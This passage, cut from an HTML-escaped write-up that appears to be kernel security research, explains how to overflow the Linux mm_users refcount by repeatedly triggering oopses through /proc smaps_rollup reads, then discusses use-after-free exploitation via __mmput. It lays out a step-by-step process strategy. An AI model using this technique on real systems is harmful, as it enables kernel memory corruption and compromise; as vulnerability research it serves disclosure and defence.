Condition 1 is unexploitable because we cannot leak the struct file refcount again without taking a mutex that will never be unlocked. Condition 3 is unexploitable because a task struct uses a safe saturating kernel &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;refcount_t&lt;/span&gt;&lt;span&gt;&amp;nbsp;which prevents the overflow condition. This leaves condition 4. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4 EakHiGVfAD-c8\"&gt;&lt;span&gt;&lt;br&gt;&lt;/span&gt;&lt;span&gt;The &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;mm_users&lt;/span&gt;&lt;span&gt;&amp;nbsp;refcount still &lt;/span&gt;&lt;span&gt;uses an overflow-unsafe &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;atomic_t&lt;/span&gt;&lt;span&gt;&amp;nbsp;and since we can take a readlock an indefinite number of times, the associated &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;mmap_read_lock&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c5\"&gt;&amp;nbsp;does not prevent us from incrementing the refcount again. There are a couple important roadblocks we need to avoid in order to repeatedly leak this refcount:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4 EakHiGVfAD-c8 EakHiGVfAD-c6\"&gt;&lt;span class=\"EakHiGVfAD-c5\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;ol class=\"c20 lst-kix_dt3x5t4funnl-0 start\" start=\"1\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c4 c8 c15 li-bullet-0\"&gt;&lt;span&gt;We cannot call this syscall from the task with the empty vma list itself - in other words, we can&amp;rsquo;t call &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;read&lt;/span&gt;&lt;span&gt;&amp;nbsp;from &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;/proc/self/smaps_rollup&lt;/span&gt;&lt;span&gt;. Such a process cannot easily make repeated syscalls since it has no virtual memory mapped. We avoid this by reading &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;smaps_rollup&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c5\"&gt;&amp;nbsp;from another process.&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c4 c8 c15 li-bullet-0\"&gt;&lt;span&gt;We must re-open the &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;smaps_rollup&lt;/span&gt;&lt;span&gt;&amp;nbsp;file every time because any future reads we perform on a &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;smaps_rollup&lt;/span&gt;&lt;span&gt;&amp;nbsp;instance we already triggered the oops on will deadlock on the local &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;seq_file&lt;/span&gt;&lt;span&gt;&amp;nbsp;mutex lock which is locked forever. We also need to destroy the resulting &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;struct file&lt;/span&gt;&lt;span&gt;&amp;nbsp;(via &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;close&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c5\"&gt;) after we generate the oops in order to prevent untenable memory usage.&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c4 c8 c15 li-bullet-0\"&gt;&lt;span&gt;If we access the &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;mm&lt;/span&gt;&lt;span&gt;&amp;nbsp;through the same pid every time, we will run into the &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;task struct&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;max refcount before we overflow the &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;mm_users&lt;/span&gt;&lt;span&gt;&amp;nbsp;refcount. Thus we need to create two separate tasks that share the same &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;mm&lt;/span&gt;&lt;span&gt;&amp;nbsp;and balance the oopses we generate across both tasks so the task refcounts grow half as quickly as the &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;mm_users&lt;/span&gt;&lt;span&gt;&amp;nbsp;refcount. We do this via the &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;clone&lt;/span&gt;&lt;span&gt;&amp;nbsp;flag &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;CLONE_VM&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c4 c8 c15 li-bullet-0\"&gt;&lt;span&gt;We must avoid opening/reading the &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;smaps_rollup&lt;/span&gt;&lt;span&gt;&amp;nbsp;file from a task that has a shared file descriptor table, as otherwise a refcount will be leaked on the &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;struct file&lt;/span&gt;&lt;span&gt;&amp;nbsp;itself. This isn&amp;rsquo;t difficult, just don&amp;rsquo;t &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;read&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c5\"&gt;&amp;nbsp;the file from a multi-threaded process.&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt;\n &lt;p class=\"EakHiGVfAD-c4 EakHiGVfAD-c8 EakHiGVfAD-c6\"&gt;&lt;span class=\"EakHiGVfAD-c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4 EakHiGVfAD-c8\"&gt;&lt;span class=\"EakHiGVfAD-c5\"&gt;Our final refcount leaking overflow strategy is as follows:&lt;br&gt;&lt;/span&gt;&lt;/p&gt;&lt;ol class=\"c20 lst-kix_ehkygwr8rii2-0 start\" start=\"1\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c4 c8 c15 li-bullet-0\"&gt;&lt;span class=\"EakHiGVfAD-c5\"&gt;Process A forks a process B&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c4 c8 c15 li-bullet-0\"&gt;&lt;span&gt;Process B issues &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;PTRACE_TRACEME&lt;/span&gt;&lt;span&gt;&amp;nbsp;so that when it segfaults upon return from &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;munmap&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c5\"&gt;&amp;nbsp;it won&amp;rsquo;t go away (but rather will enter tracing stop)&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c4 c8 c15 li-bullet-0\"&gt;&lt;span&gt;Proces B clones with &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;CLONE_VM | CLONE_PTRACE&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c5\"&gt;&amp;nbsp;another process C&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c4 c8 c15 li-bullet-0\"&gt;&lt;span&gt;Process B &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;munmap&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c5\"&gt;&amp;rsquo;s its entire virtual memory address space - this also unmaps process C&amp;rsquo;s virtual memory address space.&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c4 c8 c15 li-bullet-0\"&gt;&lt;span&gt;Process A forks new children D and E which will access (B|C)&amp;rsquo;s &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;smaps_rollup&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c5\"&gt;&amp;nbsp;file respectively&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c4 c8 c15 li-bullet-0\"&gt;&lt;span&gt;(D|E) opens (B|C)&amp;rsquo;s &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;smaps_rollup&lt;/span&gt;&lt;span&gt;&amp;nbsp;file and performs a read which will oops, causing (D|E) to die. &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;mm_users&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c5\"&gt;&amp;nbsp;will be refcount leaked/incremented once per oops&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c4 c8 c15 li-bullet-0\"&gt;&lt;span&gt;Process A goes back to step 5 ~2&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c18\"&gt;32&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c5\"&gt;&amp;nbsp;times&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt;\n &lt;p class=\"EakHiGVfAD-c4 EakHiGVfAD-c8 EakHiGVfAD-c6\"&gt;&lt;span class=\"EakHiGVfAD-c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4 EakHiGVfAD-c8\"&gt;&lt;span&gt;The above strategy can be &lt;/span&gt;&lt;span&gt;rearchitected&lt;/span&gt;&lt;span&gt;&amp;nbsp;to run in parallel (across &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c14\"&gt;processes&lt;/span&gt;&lt;span&gt;&amp;nbsp;not threads, because of roadblock 4) and improve performance.&lt;/span&gt;&lt;span&gt;&amp;nbsp;On server setups that print kernel logging to a serial console, generating 2&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c18\"&gt;32&lt;/span&gt;&lt;span&gt;&amp;nbsp;kernel oopses takes over 2 years. However on a vanilla Kali Linux box using a graphical interface, a demonstrative proof-of-concept takes only about 8 days to complete! At the completion of execution, &lt;/span&gt;&lt;span&gt;the &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;mm_users&lt;/span&gt;&lt;span&gt;&amp;nbsp;refcount will have &lt;/span&gt;&lt;span&gt;overflow&lt;/span&gt;&lt;span&gt;ed&lt;/span&gt;&lt;span&gt;&amp;nbsp;and be set to zero, even though this &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;mm&lt;/span&gt;&lt;span&gt;&amp;nbsp;is currently in use by&lt;/span&gt;&lt;span&gt;&amp;nbsp;multiple processes and can still be referenced via the &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;proc&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c5\"&gt;&amp;nbsp;filesystem.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"EakHiGVfAD-c17 EakHiGVfAD-c8\" id=\"h.6a9h8qcml5lm\"&gt;&lt;span class=\"EakHiGVfAD-c12\"&gt;Exploitation&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"EakHiGVfAD-c4 EakHiGVfAD-c8\"&gt;&lt;span&gt;Once the &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;mm_users&lt;/span&gt;&lt;span&gt;&amp;nbsp;refcount has been set to zero, triggering undefined behavior and memory corruption &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c14\"&gt;should&lt;/span&gt;&lt;span&gt;&amp;nbsp;be fairly easy. By triggering an &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;mmget&lt;/span&gt;&lt;span&gt;&amp;nbsp;and an &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;mmput&lt;/span&gt;&lt;span&gt;&amp;nbsp;(which we can very easily do by opening the &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;smaps_rollup&lt;/span&gt;&lt;span&gt;&amp;nbsp;file once more) we should be able to free the entire &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;mm&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c5\"&gt;&amp;nbsp;and cause a UAF condition:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4 EakHiGVfAD-c8 EakHiGVfAD-c6\"&gt;&lt;span class=\"EakHiGVfAD-c5\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.b3004923779b4f82824e3ea108c266097d5e31bb\"&gt;&lt;/a&gt;&lt;a id=\"t.1\"&gt;&lt;/a&gt;&lt;table class=\"EakHiGVfAD-c16\"&gt;&lt;tr class=\"EakHiGVfAD-c21\"&gt;&lt;td class=\"EakHiGVfAD-c11\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c1\"&gt;static&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c1\"&gt;inline&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c1\"&gt;void&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;__mmput&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;(&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c1\"&gt;struct&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;mm_struct &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;*&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;mm&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; VM_BUG_ON&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;(&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;atomic_read&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;(&amp;amp;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;mm&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;mm_users&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;));&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4 EakHiGVfAD-c6\"&gt;&lt;span class=\"EakHiGVfAD-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; uprobe_clear_state&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;(&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;mm&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; exit_aio&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;(&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;mm&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ksm_exit&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;(&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;mm&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; khugepaged_exit&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;(&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;mm&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; exit_mmap&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;(&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;mm&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mm_put_huge_zero_page&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;(&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;mm&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; set_mm_exe_file&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;(&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;mm&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;,&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;NULL&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c1\"&gt;if&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;(!&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;list_empty&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;(&amp;amp;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;mm&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;mmlist&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;))&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; spin_lock&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;(&amp;amp;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;mmlist_lock&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; list_del&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;(&amp;amp;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;mm&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;mmlist&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; spin_unlock&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;(&amp;amp;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;mmlist_lock&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c1\"&gt;if&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;(&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;mm&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;binfmt&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; module_put&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;(&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;mm&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;binfmt&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c1\"&gt;module&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; lru_gen_del_mm&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;(&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;mm&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mmdrop&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;(&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;mm&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"EakHiGVfAD-c4 EakHiGVfAD-c8 EakHiGVfAD-c6\"&gt;&lt;span class=\"EakHiGVfAD-c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4 EakHiGVfAD-c8\"&gt;&lt;span&gt;Unfortunately, since &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;64591e8605&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;&amp;nbsp;(&amp;ldquo;mm: protect free_pgtables with mmap_lock write lock in exit_mmap&amp;rdquo;)&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;exit_mmap&lt;/span&gt;&lt;span&gt;&amp;nbsp;unconditionally takes the &lt;/span&gt;&lt;span&gt;mmap lock&lt;/span&gt;&lt;span&gt;&amp;nbsp;in write mode. Since this &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;mm&amp;rsquo;s&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;mmap_lock&lt;/span&gt;&lt;span&gt;&amp;nbsp;is permanently readlocked &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c14\"&gt;many&lt;/span&gt;&lt;span&gt;&amp;nbsp;times, any calls to &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;__mmput&lt;/span&gt;&lt;span&gt;&amp;nbsp;will manifest as a permanent deadlock inside of &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;exit_mmap&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c5\"&gt;.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4 EakHiGVfAD-c8 EakHiGVfAD-c6\"&gt;&lt;span class=\"EakHiGVfAD-c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4 EakHiGVfAD-c8\"&gt;&lt;span class=\"EakHiGVfAD-c5\"&gt;However, before the call permanently deadlocks, it will call several other functions:&lt;/span&gt;&lt;/p&gt;&lt;ol class=\"c20 lst-kix_gx9cg4br20pa-0 start\" start=\"1\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c4 c8 c15 li-bullet-0\"&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;u&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3 EakHiGVfAD-c26\"&gt;probe_clear_state&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c4 c8 c15 li-bullet-0\"&gt;&lt;span class=\"EakHiGVfAD-c26 EakHiGVfAD-c3\"&gt;exit_aio&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c4 c8 c15 li-bullet-0\"&gt;&lt;span class=\"EakHiGVfAD-c26 EakHiGVfAD-c3\"&gt;ksm_exit&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c4 c8 c15 li-bullet-0\"&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;khugepaged_exit&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt;\n &lt;p class=\"EakHiGVfAD-c4 EakHiGVfAD-c8\"&gt;&lt;span&gt;Additionally, we can call &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;__mmput&lt;/span&gt;&lt;span&gt;&amp;nbsp;on this &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;mm&lt;/span&gt;&lt;span&gt;&amp;nbsp;from several tasks simultaneously by having each of them trigger an &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;mmget/mmput&lt;/span&gt;&lt;span&gt;&amp;nbsp;on the &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;mm&lt;/span&gt;&lt;span&gt;, generating irregular race conditions. Under normal execution, it should not be possible to trigger multiple &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;__mmput&amp;rsquo;s&lt;/span&gt;&lt;span&gt;&amp;nbsp;on the same &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;mm&lt;/span&gt;&lt;span&gt;&amp;nbsp;(much less concurrent ones) as &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;__mmput&lt;/span&gt;&lt;span&gt;&amp;nbsp;should only be called on the last and only refcount decrement which sets the refcount to zero. However, after the refcount overflow, all &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;mmget&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;mmput&amp;rsquo;s&lt;/span&gt;&lt;span&gt;&amp;nbsp;on the still-referenced &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;mm&lt;/span&gt;&lt;span&gt;&amp;nbsp;will trigger an &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;__mmput&lt;/span&gt;&lt;span&gt;. This is because each &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;mmput&lt;/span&gt;&lt;span&gt;&amp;nbsp;that decrements the refcount to zero &lt;/span&gt;&lt;span&gt;(despite the corresponding &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;mmget&lt;/span&gt;&lt;span&gt;&amp;nbsp;being why the refcount was above zero in the first place)&lt;/span&gt;&lt;span&gt;&amp;nbsp;believes that it is solely responsible for freeing the associated &lt;/span&gt;&lt;span 